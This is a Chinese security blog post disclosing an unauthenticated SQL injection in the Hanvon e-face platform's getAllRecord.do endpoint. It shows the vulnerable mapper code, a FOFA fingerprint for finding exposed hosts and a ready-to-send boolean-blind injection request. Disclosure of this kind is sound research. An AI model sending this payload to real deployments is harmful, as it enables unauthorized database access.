---
title: "汉王e脸通综合管理平台 getAllRecord.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getAllRecord-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getallrecord.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getAllRecord.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/9 08:21
* 702浏览
* [0评论](#comment)
* 35分钟阅读

深入探索

SQL

鉴权

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getAllRecord.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

漏洞扫描服务

安全研究工具

漏洞修复方案

直接看 `PatrolRecordController` 里关于 `getAllRecord` 的实现

```
@RequestMapping(
    value = {"getAllRecord"},
    method = {RequestMethod.GET}
)
@ResponseBody
public RequestJson getAllRecord(Integer page, Integer pageSize, String key, Long communityId, @DateTimeFormat(pattern = "yyyy-MM-dd") Date startTime, @DateTimeFormat(pattern = "yyyy-MM-dd") Date endTime, Long planId, Long lineId, Long teamId, String order, String columnKey) {
    RequestJson result = new RequestJson();

    try {
        if (page == null) {
            page = Constants.DEFAULT_START_PAGE_INDEX;
        }

        if (pageSize == null) {
            pageSize = Constants.PAGE_SIZE;
        }

        PatrolRecordParams record = new PatrolRecordParams();
        record.setDomainId(communityId);
        record.setKey(key);
        record.setPlanId(planId);
        record.setLineId(lineId);
        record.setTeamId(teamId);
        record.setStartTime(startTime);
        record.setEndTime(endTime);
        record.setOrder(order);
        record.setColumnKey(columnKey);
        PageHelper.startPage(page, pageSize);
        List<PatrolRecordVO> patrolRecordList = this.patrolRecordBsm.queryAllPatrolRecord(record);

public List<PatrolRecordVO> queryAllPatrolRecord(PatrolRecordParams record) {
List<PatrolRecordVO> recordVOList = this.patrolRecordDsm.queryAllPatrolRecord(record);

List<PatrolRecordVO> queryAllPatrolRecord(PatrolRecordParams var1);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 PatrolRecordDsm.xml

代码安全审计

```
<select id="queryAllPatrolRecord" resultMap="BaseResultMap2">
    SELECT pr.ID,pl.ROUTE_NAME LINE_NAME,ppl.NAME POINT_NAME,pt.TEAM_NAME teamName,pr.SIGN_TIME,pr.DEVICE_ID,pr.EMPLOYEE_ID
    FROM PATROL_RECORD pr
    LEFT JOIN PATROL_LINE pl on pl.ID = pr.LINE_ID
    LEFT JOIN PATROL_POINT ppl on ppl.ID = pr.POINT_ID
    LEFT JOIN PATROL_TEAM pt on pt.ID = pr.TEAM_ID
    where 1 = 1
    <if test="teamId != null">
        and pr.TEAM_ID = #{teamId}
    </if>
    <if test="lineId != null">
        and pr.LINE_ID = #{lineId}
    </if>
    <if test="startTime != null ">
        and date(pr.SIGN_TIME) &gt;= date(#{startTime})
    </if>
    <if test="endTime != null ">
        and  date(#{endTime}) &gt;= date(pr.SIGN_TIME)
    </if>
    <if test="domainId != null">
        and pr.DOMAIN_ID = #{domainId}
    </if>
     order by
        <if test="order == null or order == ''">
             pr.SIGN_TIME desc
        </if>
        <if test="order != null and order != ''">
             ${columnKey} ${order}
        </if>
</select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

getDailyPatrolRecord.do 也存在同样的sql注入漏洞

漏洞预警服务

[![汉王e脸通综合管理平台 getAllRecord.do SQL注入漏洞](images/img-001-2c11847360b0.webp)](https://image.mrxn.net/336f1e51dffd48aa90f40fe0ce936a32.webp)

[![汉王e脸通综合管理平台 getAllRecord.do SQL注入漏洞](images/img-002-7f481bdbbb41.webp)](https://image.mrxn.net/27f3cc150f3348eb8652f46f34ee27b2.webp)

# 漏洞复现

> 布尔盲注
>
> 物流软件安全

```
GET /manage/patrolRecord/getAllRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=pr.SIGN_TIME+RLIKE+(SELECT+(CASE+WHEN+(2962%3d2962)+THEN+0x70722e5349474e5f54494d45+ELSE+0x28+END))%23+wAOm&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1 HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getAllRecord.do SQL注入漏洞](images/img-003-833ab0da9394.webp)](https://image.mrxn.net/1b3c2834c62148e0b7499beae579b2ac.webp)

条件不等时

[![汉王e脸通综合管理平台 getAllRecord.do SQL注入漏洞](images/img-004-396b722240da.webp)](https://image.mrxn.net/660e3a5d45ff4ec5b32ee2c4cc62e4b5.webp)

响应结果是不一样的

Windows安全工具

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 getAllRecord.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-getAllRecord-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-getAllRecord-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-getAllRecord-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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